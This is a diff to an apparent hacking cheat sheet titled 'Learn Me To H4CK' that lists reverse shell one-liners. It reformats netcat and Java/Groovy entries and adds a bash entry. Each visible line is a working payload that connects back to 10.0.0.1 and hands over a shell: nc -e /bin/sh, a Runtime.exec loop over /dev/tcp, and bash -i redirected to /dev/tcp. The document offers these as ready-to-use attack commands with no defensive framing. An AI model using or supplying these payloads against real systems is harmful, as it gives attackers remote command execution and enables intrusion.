@@ -1,4 +1,4 @@
-#Learn Me To H4CK:
+# Learn Me To H4CK:
 
 PHP RevShell:
 
@@ -10,12 +10,14 @@ Ruby RevShell:
   
 Nc RevShell:
 
-   nc -e /bin/sh 10.0.0.1 1234
+    nc -e /bin/sh 10.0.0.1 1234
   
 Java RevShell:
 
-   r = Runtime.getRuntime()
-   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-   p.waitFor()
+    r = Runtime.getRuntime()
+    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+    p.waitFor()
   
-  
+Bash RevShell:
+
+    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
